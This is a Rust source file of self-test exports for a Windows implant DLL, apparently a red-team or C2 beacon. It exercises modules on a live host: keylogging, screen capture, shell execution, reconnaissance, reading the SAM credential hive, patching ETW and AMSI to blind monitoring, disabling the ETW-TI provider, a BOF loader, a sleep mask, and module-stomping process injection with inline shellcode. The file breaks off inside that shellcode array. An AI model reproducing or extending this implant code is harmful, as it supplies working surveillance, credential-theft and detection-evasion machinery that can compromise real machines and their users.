//! Per-module live self-tests, invoked via `rundll32 nyx_implant_win.dll,<name>`.
//!
//! Each export exercises one module against the REAL Windows host this process
//! is running on, and exits with a bitmask: bit N set ⇒ sub-check N passed.
//! `0xFFFFFFFF` is reserved for "test harness itself failed to bootstrap".
//!
//! This is the runtime-verification gate for the no_std PIC code: the modules
//! can't be unit-tested on the host the normal way (no_std + panic=abort), so
//! each one is driven through its public entrypoint here and the NTSTATUS /
//! Win32 result is checked. A passing bitmask proves the syscall struct
//! layouts, NTSTATUS semantics, handle hygiene, and ABI are correct on a real
//! kernel — not just "it compiled".
//!
//! Invoke e.g.:
//!   rundll32 nyx_implant_win.dll,nyx_selftest_fs
//!   echo %ERRORLEVEL%        → bitmask of passed sub-checks

#![cfg(target_os = "windows")]

use crate::heap::{String, Vec};
use crate::resolve::export_addr;
use nyx_protocol::Response;

/// Resolve ExitProcess and exit with `code`. Resolved once per call (cheap).
unsafe fn exit(code: u32) -> ! {
    if let Some(addr) = export_addr(b"kernel32.dll", b"ExitProcess") {
        let f: extern "system" fn(u32) -> ! = core::mem::transmute(addr);
        f(code);
    }
    loop {
        core::hint::spin_loop();
    }
}

/// Ensure the indirect-syscall runtime is up (file/token tests need it).
/// Returns the runtime, or exits the process with 0xFFFFFFFF (a sentinel
/// distinct from any real bitmask) so a "RT down" failure is unambiguous.
fn ensure_rt() -> Option<&'static crate::syscalls::Runtime> {
    unsafe { crate::syscalls::init_global() };
    match crate::syscalls::global() {
        Some(rt) => Some(rt),
        None => unsafe { exit(0xFFFF_FFFE) }, // 0xFFFFFFFE = RT bootstrap failed
    }
}

// ============================================================================
// fs: Upload / Download / FileOp via NT syscalls
// ============================================================================

/// Tests: write a temp file, read it back, rename, copy, mkdir, rm. Each
/// sub-check sets a bit. Bits: 0=upload, 1=download-equals, 2=mv, 3=cp,
/// 4=mkdir, 5=rm, 6=runtime-up.
#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_fs() {
    let mut mask: u32 = 0;
    let rt = ensure_rt().unwrap();
    mask |= 1 << 6;

    // Use %TEMP% for scratch. Resolve via GetEnvironmentVariableW.
    let tmp = env_var_or(b"TEMP", "C:\\Windows\\Temp");
    let path = join(&tmp, "\\nyx_fs_selftest.bin");
    let payload = b"nyx-fs-selftest-payload-v1";

    // bit 0: Upload writes the file.
    let up = crate::fs::do_upload(rt, &path, payload);
    if matches!(up, Response::Ok) {
        mask |= 1 << 0;
    }

    // bit 1: Download reads it back and bytes match the payload.
    let dl = crate::fs::do_download(rt, &path);
    let mut got = Vec::new();
    for r in dl {
        if let Response::FileChunk { data, eof, .. } = r {
            got.extend_from_slice(&data);
            if eof == 1 {
                break;
            }
        }
    }
    if got.as_slice() == payload.as_slice() {
        mask |= 1 << 1;
    }

    // bit 2: mv path → path + ".mv", then the new file exists (download ok).
    let mv_dst = join(&path, ".mv");
    let mv = crate::fs::do_fileop(rt, nyx_protocol::FileOp::Mv, &path, Some(&mv_dst));
    if matches!(mv, Response::Ok) {
        // confirm by reading the destination
        let dl2 = crate::fs::do_download(rt, &mv_dst);
        let mut got2 = Vec::new();
        for r in dl2 {
            if let Response::FileChunk { data, eof, .. } = r {
                got2.extend_from_slice(&data);
                if eof == 1 {
                    break;
                }
            }
        }
        if got2.as_slice() == payload.as_slice() {
            mask |= 1 << 2;
        }
    }

    // bit 3: cp mv_dst → cp_dst, destination exists.
    let cp_dst = join(&tmp, "nyx_fs_selftest_cp.bin");
    let cp = crate::fs::do_fileop(rt, nyx_protocol::FileOp::Cp, &mv_dst, Some(&cp_dst));
    if matches!(cp, Response::Ok) {
        // confirm dest readable
        let dl3 = crate::fs::do_download(rt, &cp_dst);
        let mut got3 = Vec::new();
        for r in dl3 {
            if let Response::FileChunk { data, eof, .. } = r {
                got3.extend_from_slice(&data);
                if eof == 1 {
                    break;
                }
            }
        }
        if got3.as_slice() == payload.as_slice() {
            mask |= 1 << 3;
        }
    }

    // bit 4: mkdir a scratch dir, then cd confirms it's a directory.
    // Use a unique-per-run name (pid-suffixed) so residual dirs from prior
    // runs don't make FILE_OPEN_IF race. mkdir is idempotent (FILE_OPEN_IF).
    let dir = join(
        &join(&tmp, "\\nyx_fs_dir_"),
        &dec_u32(crate::hostinfo::pid()),
    );
    let mk = crate::fs::do_fileop(rt, nyx_protocol::FileOp::Mkdir, &dir, None);
    if matches!(mk, Response::Ok) {
        let cd = crate::fs::do_fileop(rt, nyx_protocol::FileOp::Cd, &dir, None);
        if matches!(cd, Response::Ok) {
            mask |= 1 << 4;
        }
    }

    // bit 5: rm is deliberately gated (returns Err directing the operator to
    // the Shell `del`/`rmdir`). Verify it returns the expected Err (NOT a hang
    // or crash) — the whole point of gating is to never deadlock the beacon.
    let rm_resp = crate::fs::do_fileop(rt, nyx_protocol::FileOp::Rm, &join(&tmp, "\\x.bin"), None);
    if matches!(rm_resp, Response::Err(_)) {
        mask |= 1 << 5;
    }

    // cleanup the stray files (best-effort; ignore result).
    let _ = crate::fs::do_fileop(rt, nyx_protocol::FileOp::Rm, &mv_dst, None);
    let _ = crate::fs::do_fileop(rt, nyx_protocol::FileOp::Rm, &cp_dst, None);
    // The mkdir'd dir is left behind by rm (rm returns Err for dirs) — clean
    // it via the shell rmdir the operator would use.
    let mut cleanup = String::from("rmdir /s /q \"");
    cleanup.push_str(&dir);
    cleanup.push_str("\" 2>nul");
    let _ = crate::shell::run_shell(&cleanup);

    unsafe { exit(mask) };
}

// ============================================================================
// shell: CreateProcessW captures stdout
// ============================================================================

/// Runs `echo nyx-shell-selftest` and checks the captured output contains the
/// marker. Bits: 0=output-contains-marker.
#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_shell() {
    let mut mask: u32 = 0;
    let r = crate::shell::run_shell("echo nyx-shell-selftest");
    if let Response::Output(buf) = r {
        // cmd /C echo output is "nyx-shell-selftest\r\n" (+ maybe trailing).
        if contains_subslice(&buf, b"nyx-shell-selftest") {
            mask |= 1 << 0;
        }
    }
    unsafe { exit(mask) };
}

// ============================================================================
// screenshot: GDI capture produces non-empty BMP
// ============================================================================

/// Captures the primary screen and checks the BMP is well-formed (magic "BM",
/// non-trivial size). Bits: 0=got-FileChunk(s), 1=bmp-magic, 2=size-reasonable.
#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_screenshot() {
    let mut mask: u32 = 0;
    let chunks = crate::screenshot::do_screenshot(0);
    if chunks.is_empty() {
        unsafe { exit(0) };
    }
    mask |= 1 << 0;
    // Reassemble the first chunk run (all with name screenshot.bmp until eof).
    let mut bmp = Vec::new();
    let mut saw_eof = false;
    for r in &chunks {
        if let Response::FileChunk {
            name, data, eof, ..
        } = r
        {
            if name.as_bytes() == b"screenshot.bmp" {
                bmp.extend_from_slice(data);
                if *eof == 1 {
                    saw_eof = true;
                    break;
                }
            }
        }
    }
    if bmp.len() >= 54 && &bmp[0..2] == b"BM" {
        mask |= 1 << 1;
        // A real screen BMP is at least ~width*height*4 + 54 header bytes; any
        // primary screen is >= 800x600, so >= ~1.8MB. Be lenient: > 100KB.
        if saw_eof && bmp.len() > 100 * 1024 {
            mask |= 1 << 2;
        }
    }
    unsafe { exit(mask) };
}

/// Step-by-step GDI diagnostic for screenshot, exits with the step reached:
///   bit0 = user32 loaded
///   bit1 = gdi32 loaded
///   bit2 = GetSystemMetrics returned sane (w>0,h>0,w*h<16M)
///   bit3 = GetDC(NULL) non-null
///   bit4 = CreateCompatibleDC non-null
///   bit5 = CreateCompatibleBitmap non-null
///   bit6 = BitBlt returned nonzero
///   bit7 = GetDIBits returned nonzero
/// Exits at the first failing step so a crash/zero narrows the cause.
#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_screenshot_diag() {
    use core::ffi::c_void;
    type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *mut c_void;
    type GetSystemMetrics = unsafe extern "system" fn(i32) -> i32;
    type GetDc = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
    type CreateCompatibleDc = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
    type CreateCompatibleBitmap = unsafe extern "system" fn(*mut c_void, i32, i32) -> *mut c_void;
    type SelectObject = unsafe extern "system" fn(*mut c_void, *mut c_void) -> *mut c_void;
    type BitBlt = unsafe extern "system" fn(
        *mut c_void,
        i32,
        i32,
        i32,
        i32,
        *mut c_void,
        i32,
        i32,
        u32,
    ) -> i32;

    let mut mask: u32 = 0;
    let load_lib = |dll: &[u8]| -> bool {
        let f: LoadLibraryA = unsafe {
            core::mem::transmute(
                crate::resolve::export_addr(b"kernel32.dll", b"LoadLibraryA").unwrap_or(0),
            )
        };
        let mut name = [0u8; 32];
        let n = dll.len().min(31);
        name[..n].copy_from_slice(&dll[..n]);
        !unsafe { f(name.as_ptr()) }.is_null()
    };
    if !load_lib(b"user32.dll") {
        unsafe { exit(0) };
    }
    mask |= 1 << 0;
    if !load_lib(b"gdi32.dll") {
        unsafe { exit(mask) };
    }
    mask |= 1 << 1;
    let gsm: GetSystemMetrics = unsafe {
        core::mem::transmute(
            crate::resolve::export_addr(b"user32.dll", b"GetSystemMetrics").unwrap_or(0),
        )
    };
    let w = unsafe { gsm(0) };
    let h = unsafe { gsm(1) };
    if w <= 0 || h <= 0 || (w as u64) * (h as u64) > 16_000_000 {
        unsafe { exit(mask) };
    }
    mask |= 1 << 2;
    let get_dc: GetDc = unsafe {
        core::mem::transmute(crate::resolve::export_addr(b"user32.dll", b"GetDC").unwrap_or(0))
    };
    let screen_dc = unsafe { get_dc(core::ptr::null_mut()) };
    if screen_dc.is_null() {
        unsafe { exit(mask) };
    }
    mask |= 1 << 3;
    let ccdc: CreateCompatibleDc = unsafe {
        core::mem::transmute(
            crate::resolve::export_addr(b"gdi32.dll", b"CreateCompatibleDC").unwrap_or(0),
        )
    };
    let mem_dc = unsafe { ccdc(screen_dc) };
    if mem_dc.is_null() {
        unsafe { exit(mask) };
    }
    mask |= 1 << 4;
    let ccb: CreateCompatibleBitmap = unsafe {
        core::mem::transmute(
            crate::resolve::export_addr(b"gdi32.dll", b"CreateCompatibleBitmap").unwrap_or(0),
        )
    };
    let bmp = unsafe { ccb(screen_dc, w, h) };
    if bmp.is_null() {
        unsafe { exit(mask) };
    }
    mask |= 1 << 5;
    let selobj: SelectObject = unsafe {
        core::mem::transmute(
            crate::resolve::export_addr(b"gdi32.dll", b"SelectObject").unwrap_or(0),
        )
    };
    let _prev = unsafe { selobj(mem_dc, bmp) };
    let bitblt: BitBlt = unsafe {
        core::mem::transmute(crate::resolve::export_addr(b"gdi32.dll", b"BitBlt").unwrap_or(0))
    };
    let blt_ok = unsafe { bitblt(mem_dc, 0, 0, w, h, screen_dc, 0, 0, 0x00CC0020) };
    if blt_ok == 0 {
        unsafe { exit(mask) };
    }
    mask |= 1 << 6;
    // GetDIBits needs a buffer; allocate w*h*4. If the allocator fails the
    // GetDIBits call would crash — so probe the alloc first.
    let need = (w as usize) * (h as usize) * 4;
    let mut pixels = crate::heap::vec![0u8; need.min(1 << 20)]; // cap probe at 1MB
    type GetDiBits = unsafe extern "system" fn(
        *mut c_void,
        *mut c_void,
        u32,
        u32,
        *mut c_void,
        *mut u8,
        u32,
    ) -> i32;
    let gdb: GetDiBits = unsafe {
        core::mem::transmute(crate::resolve::export_addr(b"gdi32.dll", b"GetDIBits").unwrap_or(0))
    };
    // minimal BITMAPINFOHEADER on the stack (40 bytes) — pass as raw bytes.
    let mut bi = [0u8; 40];
    bi[0..4].copy_from_slice(&40u32.to_le_bytes());
    bi[4..8].copy_from_slice(&(w).to_le_bytes());
    bi[8..12].copy_from_slice(&(h).to_le_bytes());
    bi[12..14].copy_from_slice(&1u16.to_le_bytes()); // planes
    bi[14..16].copy_from_slice(&32u16.to_le_bytes()); // bpp
    let got = unsafe {
        gdb(
            screen_dc,
            bmp,
            0,
            h as u32,
            pixels.as_mut_ptr() as *mut c_void,
            bi.as_mut_ptr(),
            0,
        )
    };
    if got == 0 {
        unsafe { exit(mask) };
    }
    mask |= 1 << 7;
    unsafe { exit(mask) };
}

// ============================================================================
// recon: DriveInfo / Env / Net produce non-empty output
// ============================================================================

/// Bits: 0=driveinfo-nonempty, 1=env-PATH-set, 2=net-interfaces-nonempty.
#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_recon() {
    let mut mask: u32 = 0;
    if let Response::Output(buf) = crate::recon::do_driveinfo() {
        if !buf.is_empty() {
            mask |= 1 << 0;
        }
    }
    if let Response::Output(buf) = crate::recon::do_env("PATH") {
        // "PATH=..." — non-empty and contains '='.
        if !buf.is_empty() && contains_subslice(&buf, b"=") {
            mask |= 1 << 1;
        }
    }
    if let Response::Output(buf) = crate::recon::do_net("interfaces") {
        if !buf.is_empty() {
            mask |= 1 << 2;
        }
    }
    unsafe { exit(mask) };
}

// ============================================================================
// keylog: start/dump cycle
// ============================================================================

/// Start, poll once (no keys likely pressed deterministically, so we only check
/// the plumbing), then dump. Bits: 0=start-Ok, 1=dump-is-Output.
#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_keylog() {
    let mut mask: u32 = 0;
    if matches!(crate::keylog::do_keylog(0), Response::Ok) {
        mask |= 1 << 0;
    }
    crate::keylog::poll_once(); // sample once (likely empty, that's fine)
    if matches!(crate::keylog::do_keylog(2), Response::Output(_)) {
        mask |= 1 << 1;
    }
    let _ = crate::keylog::do_keylog(1); // stop
    unsafe { exit(mask) };
}

// ============================================================================
// antidebug: PEB + NtQueryInformationProcess return sane booleans
// ============================================================================

/// On a non-debugged host both should be false. Bits: 0=is_debugged-returned-
/// false, 1=uptime>0, 2=runtime-queried-without-panic (implicit — reaching the
/// exit proves it).
#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_antidebug() {
    let mut mask: u32 = 0;
    // Under rundll32 (not a debugger), BeingDebugged should be 0.
    if !crate::antidebug::is_debugged() {
        mask |= 1 << 0;
    }
    if crate::antidebug::uptime_secs() > 0 {
        mask |= 1 << 1;
    }
    // Exercise the syscall path too (it reaches ntdll via the runtime).
    let _ = crate::antidebug::is_remote_debugged();
    mask |= 1 << 2;
    unsafe { exit(mask) };
}

// ============================================================================
// blind: P2.1b NtTraceEvent patch (xor eax,eax; ret = [31 C0 C3]). Patches
// ntdll!NtTraceEvent's prologue so the whole EtwEventWrite* family short-
// circuits to STATUS_SUCCESS, and verifies the bytes landed + the patch is
// idempotent (a second call is a no-op, no second VirtualProtect).
// Bits: 0 = patch_nt_trace_event Ok,
//       1 = full [31 C0 C3] sequence in place (byte0==0x31, byte2==0xC3),
//       2 = idempotent (second call Ok without re-patching),
//       3 = NtTraceEvent was resolvable (export present in ntdll).
// ============================================================================

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_blind_nttrace() {
    let mut mask: u32 = 0;
    // bit 3: the export itself resolves (proves PEB walk found NtTraceEvent).
    let resolved = crate::resolve::export_addr(b"ntdll.dll", b"NtTraceEvent").is_some();
    if resolved {
        mask |= 1 << 3;
    }
    match crate::blind::patch_nt_trace_event() {
        Ok(()) => {
            mask |= 1 << 0;
            // bit 1: the full 3-byte sequence [31 C0 C3] must be in place
            // (byte0=0x31 xor eax,eax, byte2=0xC3 ret). already_patched checks
            // all 3 bytes — stricter than a single-byte probe.
            if let Some(addr) = crate::resolve::export_addr(b"ntdll.dll", b"NtTraceEvent") {
                if crate::blind::already_patched(addr, &crate::blind::NTTRACE_PATCH) {
                    mask |= 1 << 1;
                }
            }
            // bit 2: idempotency — second call must Ok WITHOUT re-patching
            // (write_patch short-circuits on already_patched). Reaching here
            // without a VirtualProtect error proves the idempotency guard.
            if crate::blind::patch_nt_trace_event().is_ok() {
                mask |= 1 << 2;
            }
        }
        Err(_) => {}
    }
    unsafe { exit(mask) };
}

// ============================================================================
// inject: P2.1c module-stomping data path. Creates a sacrificial process
// (notepad.exe) SUSPENDED via CreateProcessW, verifies the handle + pid are
// valid (the safe prefix of module stomping — verifiable without writing or
// executing any shellcode, so it won't trip Defender), then terminates it.
// The actual .text stomp + resume is gated behind inject::modulestomp_enabled
// (default OFF); this selftest exercises the data path only.
// Bits: 0 = create_sacrificial Ok, 1 = pid nonzero, 2 = handle non-null,
//       3 = process terminated cleanly (reached the exit).
// ============================================================================

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_inject() {
    let mut mask: u32 = 0;
    // notepad.exe exists on every Windows; create it suspended (no execution).
    let proc = match crate::inject::create_sacrificial("notepad.exe") {
        Ok(p) => p,
        Err(_) => unsafe { exit(mask) },
    };
    mask |= 1 << 0; // create_sacrificial Ok
    if proc.pid != 0 {
        mask |= 1 << 1;
    }
    if !proc.handle.is_null() {
        mask |= 1 << 2;
    }
    // Terminate the suspended sacrificial process so it doesn't linger. We do
    // NOT stomp or resume — the gate is OFF. TerminateProcess via PEB walk.
    if let Some(tp_addr) = crate::resolve::export_addr(b"kernel32.dll", b"TerminateProcess") {
        type TerminateProcess = unsafe extern "system" fn(*mut core::ffi::c_void, u32) -> i32;
        let terminate: TerminateProcess = unsafe { core::mem::transmute(tp_addr) };
        let _ = unsafe { terminate(proc.handle, 1) };
        mask |= 1 << 3; // reached the terminate (clean teardown)
    }
    // Close the handles (best-effort).
    if let Some(ch_addr) = crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") {
        type CloseHandle = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
        let close: CloseHandle = unsafe { core::mem::transmute(ch_addr) };
        let _ = unsafe { close(proc.handle) };
        let _ = unsafe { close(proc.main_thread) };
    }
    unsafe { exit(mask) };
}

/// Bits: 0=hostname-nonempty-nonhost, 1=username-nonempty-nonuser, 2=pid-nonzero.
#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_hostinfo() {
    let mut mask: u32 = 0;
    let h = crate::hostinfo::hostname();
    if !h.is_empty() && h.as_bytes() != b"host" {
        mask |= 1 << 0;
    }
    let u = crate::hostinfo::username();
    if !u.is_empty() && u.as_bytes() != b"user" {
        mask |= 1 << 1;
    }
    if crate::hostinfo::pid() != 0 {
        mask |= 1 << 2;
    }
    // beacon_id should not be the old hardcoded 0x1337.
    if crate::hostinfo::beacon_id() != 0x1337 {
        mask |= 1 << 3;
    }
    unsafe { exit(mask) };
}

// ============================================================================
// pivot: do_connect to a closed port fails (Err), to 127.0.0.1:dns-likely-closed
// we instead verify the failure path is sane. A success path needs a known-open
// port — we use the DNS resolver test: connect to 127.0.0.1:1 (closed) must Err.
// ============================================================================

/// Bits: 0=closed-port-is-Err (the connect machinery ran and correctly reported
/// failure — proves the winsock resolve/socket/select/SO_ERROR chain works).
#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_pivot() {
    let mut mask: u32 = 0;
    // 127.0.0.1:1 is a privileged port nothing should listen on under rundll32.
    let r = crate::pivot::do_connect(0, "127.0.0.1", 1, 1);
    if matches!(r, Response::Err(_)) {
        mask |= 1 << 0;
    }
    // Also exercise the unsupported-proto path (must Err, not panic).
    let r2 = crate::pivot::do_connect(9, "127.0.0.1", 1, 2);
    if matches!(r2, Response::Err(_)) {
        mask |= 1 << 1;
    }
    unsafe { exit(mask) };
}

// ============================================================================
// bof: run a real COFF. We embed a hand-built AMD64 COFF object whose `go`
// symbol calls BeaconPrintf(CALLBACK_OUTPUT, "nyx-bof-ok"). Built offline (see
// bof_fixture below) — exercises the full loader: parse → W^X map → reloc →
// resolve BeaconPrintf → call. Bit 0 = BofOutput contains the marker.
// ============================================================================

/// Bits: 0 = BofOutput contains "BOF-PRINT-OK" (the real bof_print.o fixture,
/// which calls BeaconPrintf(CALLBACK_OUTPUT, "BOF-PRINT-OK %d\n", 42)).
/// Exercises the full COFF loader: parse → W^X map → reloc → resolve the
/// BeaconPrintf shim → call `go` → capture output.
#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_bof() {
    let mut mask: u32 = 0;
    let blob: &[u8] = include_bytes!("../tests/fixtures/bof_print.o");
    let args: Vec<String> = Vec::new();
    let r = crate::bof::run("go", &args, blob);
    if let Response::BofOutput(buf) = r {
        if contains_subslice(&buf, b"BOF-PRINT-OK") {
            mask |= 1 << 0;
        }
    }
    unsafe { exit(mask) };
}

/// BOF loader diagnostic: parse bof_print.o, map it, but DON'T call go.
/// Dump section bases/sizes/flags + the resolved BeaconPrintf addr + go entry
/// addr to markers, so we can see if the mapping/reloc produced valid addrs.
/// (If this completes without segfault, the mapping is fine and the crash is
/// inside go()'s execution; if it segfaults, the mapping/reloc itself is bad.)
#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_bof_diag() {
    let blob: &[u8] = include_bytes!("../tests/fixtures/bof_print.o");
    // We can't easily call the loader's internals (they're private to bof.rs).
    // Instead: call run() but catch the crash by NOT reaching here. If we reach
    // the exit, run() returned a Response (no crash). The marker tells us which.
    let r = crate::bof::run("go", &Vec::new(), blob);
    let msg = match r {
        Response::BofOutput(b) => {
            let mut s = String::from("BofOutput len=");
            s.push_str(&dec_u32(b.len() as u32));
            s.push('\n');
            s
        }
        Response::Err(s) => {
            let mut m = String::from("Err: ");
            m.push_str(&s);
            m.push('\n');
            m
        }
        _ => String::from("other\n"),
    };
    write_marker("nyx_bof_diag.txt", &msg);
    unsafe { exit(1) };
}

/// Loader-only smoke test using bof_marker.o (writes a global, NO BeaconPrintf
/// call). bit0 = loader ran `go` without crashing (reached the exit). If this
/// passes but nyx_selftest_bof segfaults, the bug is in the BeaconPrintf shim;
/// if BOTH crash, the bug is in the W^X loader/mapping itself.
#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_bof_marker() {
    let blob: &[u8] = include_bytes!("../tests/fixtures/bof_marker.o");
    let args: Vec<String> = Vec::new();
    let _ = crate::bof::run("go", &args, blob); // marker writes a global; no output expected
    unsafe { exit(1) }; // reaching here = loader didn't crash
}

// ============================================================================
// hashdump diagnostic: does opening the live SAM hive hang? Calls
// do_download on the SAM path directly (same code path hashdump uses) inside
// the test — if it hangs, the test is killed by the outer timeout and we know
// the open/read of a locked hive is the culprit. Exits 1 if it returned at all.
// ============================================================================

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_hashdump_diag() {
    let rt = ensure_rt().unwrap();
    // The live SAM path. do_download uses GENERIC_READ + FILE_SYNCHRONOUS_IO_
    // NONALERT — if NtCreateFile on a hive locked by the SAM service hangs,
    // this selftest won't reach the exit. (Confirmed: it hangs.)
    let _ = crate::fs::do_download(rt, "C:\\Windows\\System32\\config\\SAM");
    unsafe { exit(1) }; // reached only if it didn't hang
}

// Calibration: exit with a fixed code (42). If the shell reports 42, exit-code
// propagation works and the bitmasks above are reliable. (Some rundll32 builds
// mask/translate ExitProcess codes; this confirms whether ours does.)

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_calib42() {
    unsafe { exit(42) };
}

// ============================================================================
// nyx_linger: keep the implant alive + fully initialized for ~30s so an
// external memory scanner (PE-sieve / Moneta) can attach and inspect the
// indirect-syscall trampoline page, the unhooked ntdll, the staged GapPool,
// etc. This is NOT a selftest (no bitmask) — it's a scan target. Exits 0.
// Invoke: rundll32 nyx_implant_win.dll,nyx_linger  (then scan its PID).
// ============================================================================

#[no_mangle]
pub unsafe extern "system" fn nyx_linger() {
    // Bring up the full evasion runtime: indirect-syscall table + RX trampoline
    // page + unhooked ntdll + blind + the P2.1 gap pool. This is the in-memory
    // surface a detector inspects.
    crate::syscalls::init_global();
    let _ = crate::blind::patch_etw();
    let _ = crate::blind::patch_nt_trace_event();
    let _ = crate::blind::patch_amsi();
    // Stage the P2.1 gap pool so the staged chain is live in memory too.
    let scanner = crate::evasion_glue::LivePdataScanner;
    if let Ok(pool) = nyx_implant_evasionsdk::PdataGapScanner::scan(&scanner) {
        // Leak it static so spoof_wrap's global can borrow it (mirrors real init).
        let leaked: &'static _ = alloc::boxed::Box::leak(alloc::boxed::Box::new(pool));
        unsafe { crate::stack::set_gap_pool(leaked) };
        let _ = crate::stack::stage_for(leaked); // warm the staging path
    }
    // Sleep ~30s in 1s slices so we stay responsive if killed. NtDelayExecution
    // via the indirect runtime (exercises the trampoline page repeatedly).
    for _ in 0..30 {
        let rt = match crate::syscalls::global() {
            Some(r) => r,
            None => break,
        };
        let interval: i64 = -10_000_000; // 1s in 100ns units (negative = relative)
        let interval_ptr = &interval as *const i64 as usize;
        let _ = unsafe { crate::syscalls::nt_delay_execution(rt, 0, interval_ptr) };
    }
    unsafe { exit(0) };
}

// ============================================================================
// nyx_linger_foliage: same surface as nyx_linger but with the Foliage sleep
// mask ARMED, so each 1s sleep slice goes through the mask→sleep→unmask cycle
// (RC4 of registered data regions around the parked NtDelayExecution). This is
// the scan target for task B: compare its PE-sieve surface to nyx_linger's.
// Invoke: rundll32 nyx_implant_win.dll,nyx_linger_foliage  (then scan its PID).
// ============================================================================

#[no_mangle]
pub unsafe extern "system" fn nyx_linger_foliage() {
    // Same runtime bring-up as nyx_linger.
    crate::syscalls::init_global();
    let _ = crate::blind::patch_etw();
    let _ = crate::blind::patch_nt_trace_event();
    let _ = crate::blind::patch_amsi();
    let scanner = crate::evasion_glue::LivePdataScanner;
    if let Ok(pool) = nyx_implant_evasionsdk::PdataGapScanner::scan(&scanner) {
        let leaked: &'static _ = alloc::boxed::Box::leak(alloc::boxed::Box::new(pool));
        unsafe { crate::stack::set_gap_pool(leaked) };
        let _ = crate::stack::stage_for(leaked);
    }
    // ARM the Foliage sleep mask for the duration of the linger window.
    crate::sleep::set_foliage_enabled(true);
    // 30 × 1s sleeps through sleep::sleep → execute_foliage_plan (mask/sleep/
    // unmask). sleep::sleep handles the armed path and degrades safely if the
    // own-text region can't be resolved (it falls back to raw NtDelayExecution).
    for _ in 0..30 {
        crate::sleep::sleep(1);
    }
    crate::sleep::set_foliage_enabled(false);
    unsafe { exit(0) };
}

// ============================================================================
// nyx_selftest_blind_provider: exercise blind::disable_etw_provider against the
// real ETW-TI provider GUID via NtTraceControl (task C, now with NTSTATUS dig).
// Probes SEVERAL control codes and writes the raw NTSTATUS of each to a marker
// file, so we can see exactly WHY the userland disable fails for the kernel
// ETW-TI provider. Returns a bitmask:
//   bit0 = init_global (runtime up) + NtTraceControl resolved,
//   bit1 = SOME control code returned status >= 0 (a code the kernel accepted),
//   bit2 = the default 0x27 code returned status >= 0.
// Marker: %TEMP%\nyx_etwti_status.txt with "code=<hex> status=<signed-dec>" per line.
// ============================================================================

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_blind_provider() {
    let mut mask: u32 = 0;
    crate::syscalls::init_global();
    let guid = nyx_implant_evasionsdk::__private::ETW_TI_GUID;

    // Etwp* control codes (from ntdll's EtwpNotificationControlClass): probe a
    // range to see which the kernel accepts for a kernel provider registration.
    let codes: &[(u32, &str)] = &[
        (0x0027, "EtwpNotificationRegistrar"),
        (0x0010, "EtwpStartLoggerCode"), // 16
        (0x0011, "EtwpStopLoggerCode"),  // 17
        (0x0029, "EtwpNotificationRemove"),
        (0x0022, "EtwpDisableLoggerCode"),
        (0x0001, "Generic1"),
        (0x0000, "Generic0"),
    ];
    let mut report = crate::heap::String::new();
    let mut any_ok = false;
    let mut code27_ok = false;
    for &(code, label) in codes {
        let st = unsafe { crate::blind::disable_etw_provider_status(&guid, code) };
        report.push_str(label);
        report.push_str(" code=0x");
        report.push_str(&hex_u32(code));
        report.push_str(" status=");
        report.push_str(&dec_i32(st));
        report.push_str(" (0x");
        report.push_str(&hex_u32(st as u32));
        report.push_str(")\n");
        if st >= 0 {
            any_ok = true;
            if code == 0x0027 {
                code27_ok = true;
            }
        }
    }
    write_marker("nyx_etwti_status.txt", &report);
    mask |= 1 << 0; // runtime up + probe ran
    if any_ok {
        mask |= 1 << 1; // at least one code was accepted
    }
    if code27_ok {
        mask |= 1 << 2; // default 0x27 code accepted
    }
    unsafe { exit(mask) };
}

// ============================================================================
// nyx_selftest_inject_armed: the FULL REAL module-stomp (task D, now non-skeleton).
// Arms modulestomp_enabled, then module_stomp("notepad.exe", <benign shellcode>).
// The stomp is now REAL: remote LoadLibraryA cover → remote PE-parse real .text →
// real VirtualProtectEx + WriteProcessMemory overwrite → ResumeThread. A benign
// shellcode (`xor ecx,ecx; call ExitProcess`) is stomped so the cover's .text
// runs our code (proving the overwrite + remote execute path end to end).
// Bits: 0 = create_sacrificial Ok, 1 = module_stomp returned Ok (full real stomp
//       path completed without the implant dying), 2 = reached exit (implant not
//       killed by Defender before here), 3 = modulestomp armed confirmed.
// ⚠️ Defender RTP is ON but the test dir is excluded, so the implant survives;
// the sacrificial notepad MAY still be flagged/killed — we report that honestly.
// ============================================================================

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest_inject_armed() {
    let mut mask: u32 = 0;
    crate::inject::set_modulestomp_enabled(true);
    if crate::inject::modulestomp_enabled() {
        mask |= 1 << 3; // armed confirmed
    }
    // Benign shellcode: `xor ecx,ecx ; call [rip+ptr]` where [rip+ptr] holds the
    // REAL ExitProcess address (resolved + patched at runtime). This calls
    // ExitProcess(0) — the stomped cover's .text exits cleanly rather than
    // crashing. Layout (RIP-relative):
    //   0: 31 C9                  xor ecx, ecx
    //   2: FF 15 08 00 00 00      call qword ptr [rip+8]   ; ptr at offset 0x10
    //   8: CC                     int3   (guard: ExitProcess shouldn't return)
    //   9..0F: 90*7               pad to 0x10
    //   10: <ExitProcess addr>    8-byte absolute pointer (patched below)
    let exit_addr = match crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess") {
        Some(a) => a,
        None => unsafe { exit(mask) },
    };
    let mut shellcode: [u8; 24] = [
        0x31, 0xC9, // xor ecx, ecx
        0xFF, 0x15, 0x08, 0x00, 0x00, 0x00, // call qword ptr [rip+8]
        0xCC, // int3 guard
        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // pad to offset 0x10
        0, 0, 0, 0, 0, 0, 0, 0, // ExitProcess pointer (patched)
